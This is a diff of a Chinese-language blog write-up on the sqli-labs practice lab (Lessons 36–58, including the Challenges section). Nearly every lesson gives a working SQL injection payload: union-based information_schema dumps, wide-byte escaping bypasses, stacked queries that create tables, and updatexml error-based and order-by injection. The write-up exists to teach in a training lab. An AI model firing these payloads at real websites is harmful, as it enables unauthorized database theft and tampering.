@@ -277,7 +277,7 @@ echo $string;</code></pre><p>escape 转义反斜杠为什么需要 “\\\“ 六
 <pre><code>?id=-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()) ,3 %23</code></pre><h2 id="Lesson-36"><a href="#Lesson-36" class="headerlink" title="Lesson 36"></a>Lesson 36</h2><p>之前提到过的 mysql_real_escape_string() 函数，再看一遍函数原理：<br><img src="/images/Sqli_Lab_Learning/mysql_real_escape_string.png" alt></p>
 <p>单引号被转义，同 addslashes 的情况一样。并且满足存在语句：mysql_query(“SET NAMES gbk”); ，所以使用宽字节注入。<br>GET 方法，单引号闭合。<br>payload:</p>
 <pre><code>?id=-1 %df&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),2%23</code></pre><h2 id="Lesson-37"><a href="#Lesson-37" class="headerlink" title="Lesson 37"></a>Lesson 37</h2><p>POST 方法，单引号闭合。uname 和 passwd 都带有 mysql_real_escape_string（）函数转义。同上面 addslashes 思路基本一样。需要注意的是 POST 方法下，注入字符需要用字符形式表示。</p>
-<pre><code>uname=-1�&#39; union select (select group_concat(table_name) from information_schema.tables where table_schema=database()),1 %23&amp;passwd=1</code></pre><h1 id="Stacked-Injections"><a href="#Stacked-Injections" class="headerlink" title="Stacked Injections"></a>Stacked Injections</h1><h2 id="Lesson-38"><a href="#Lesson-38" class="headerlink" title="Lesson 38"></a>Lesson 38</h2><p>可以使用普通的联合查询进行注入，GET 传值，单引号闭合。<br>payload:</p>
+<pre><code>uname=-1�&#39; union select (select group_concat(table_name) from information_schema.tables where table_schema=database()),1 %23&amp;passwd=1</code></pre><h1 id="Stacked-Injections"><a href="#Stacked-Injections" class="headerlink" title="Stacked Injections"></a>Stacked Injections</h1><h2 id="Lesson-38-堆叠注入"><a href="#Lesson-38-堆叠注入" class="headerlink" title="Lesson 38 堆叠注入"></a>Lesson 38 堆叠注入</h2><p>可以使用普通的联合查询进行注入，GET 传值，单引号闭合。<br>payload:</p>
 <pre><code>?id=&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),2 %23</code></pre><p>这题也涉及堆叠注入。使用堆叠注入的前提是存在 mysqli_multi_query( ) 函数（支持多条查询）。但是很多情况下数据库往往调用的是 mysqli_ query( ) 函数（只支持一条查询）。在手册查看一下mysqli_multi_query( ) 函数。</p>
 <p><img src="/images/Sqli_Lab_Learning/mysqli_multi_query.png" alt></p>
 <p>由于可以执行多条 SQL 语句，堆叠注入可以对数据库进行增删改查的操作。打破了联合查询的限制。<br>创建新表 test。<br>payload:</p>
@@ -296,7 +296,7 @@ echo $string;</code></pre><p>escape 转义反斜杠为什么需要 “\\\“ 六
 <pre><code>login_user=admin&amp;login_password=&#39;;create table test like users #&amp;mysubmit=Login</code></pre><p>时间盲注亦可。</p>
 <h2 id="Lesson-45"><a href="#Lesson-45" class="headerlink" title="Lesson 45"></a>Lesson 45</h2><p>跟上一题相同，唯一不同的在于变成了 ‘) 闭合。<br>payload:</p>
 <pre><code>login_user=admin&amp;login_password=&#39;);create table test like users #&amp;mysubmit=Login</code></pre><p>时间盲注亦可。</p>
-<h2 id="Lesson-46"><a href="#Lesson-46" class="headerlink" title="Lesson 46"></a>Lesson 46</h2><p>order by 注入。什么是 order by 注入？</p>
+<h2 id="Lesson-46-order-by-注入"><a href="#Lesson-46-order-by-注入" class="headerlink" title="Lesson 46 order by 注入"></a>Lesson 46 order by 注入</h2><p>order by 注入。什么是 order by 注入？</p>
 <p>可控制的位置在order by子句后，如下order参数可控：select * from goods order by $_GET[‘sort’]</p>
 <p>报错注入。<br>尽管如此，由于存在 print_error ，依然可以使用报错注入。GET 传值，单引号屏蔽。<br>payload:</p>
 <pre><code>?sort=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)</code></pre><p>这题亦可以使用盲注。</p>
@@ -393,7 +393,14 @@ if __name__ == &quot;__main__&quot;:
 <pre><code>?sort=1;create table test like users </code></pre><p>时间盲注，exp 同 Lesson 48。</p>
 <h2 id="Lesson-53"><a href="#Lesson-53" class="headerlink" title="Lesson 53"></a>Lesson 53</h2><p>跟上一题相同，存在堆叠注入和时间盲注，唯一区别在于这题为单引号闭合。<br>堆叠注入，GET 传值，单引号闭合。<br>payload:</p>
 <pre><code>?sort=1&#39;;create table test like users %23</code></pre><p>时间盲注，exp 同 Lessson 49。</p>
-<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1>
+<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><h2 id="Lesson-54"><a href="#Lesson-54" class="headerlink" title="Lesson 54"></a>Lesson 54</h2><p>题目有英文提示：</p>
+<pre><code>The objective of this challenge is to dump the (secret key) from only random table from Database (&#39;CHALLENGES&#39;) in Less than 10 attempts
+For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.</code></pre><p>大概的意思是，注入的次数如果大于10次，那么数据库端会将表名和字段名以及 secret_key 重置。因此盲注是行不通的了。</p>
+<p>使用普通的联合注入，GET 传值，单引号闭合。<br>payload:</p>
+<pre><code>?id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 %23</code></pre><h2 id="Lesson-55"><a href="#Lesson-55" class="headerlink" title="Lesson 55"></a>Lesson 55</h2><p>跟上一题基本相同，不同的地方在于注入的次数不大于14次，并且变成了 ) 闭合。<br>普通的联合注入，GET 传值，单括号闭合。<br>payload:</p>
+<pre><code>?id=-1) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 %23</code></pre><h2 id="Lesson-56"><a href="#Lesson-56" class="headerlink" title="Lesson 56"></a>Lesson 56</h2><p>跟上题相同，不同的地方在于变成了 ‘) 闭合。<br>普通的联合注入，GET 传值。<br>payload:</p>
+<pre><code>?id=-1&#39;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 %23</code></pre><h2 id="Lesson-57"><a href="#Lesson-57" class="headerlink" title="Lesson 57"></a>Lesson 57</h2><p>跟上题相同，不同的地方在于变成了双引号闭合。<br>普通的联合注入，GET 传值。<br>payload:</p>
+<pre><code>?id=-1&quot; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 %23</code></pre><h2 id="Lesson-58"><a href="#Lesson-58" class="headerlink" title="Lesson 58"></a>Lesson 58</h2>
                             <hr>
                         </div>
                         <br>
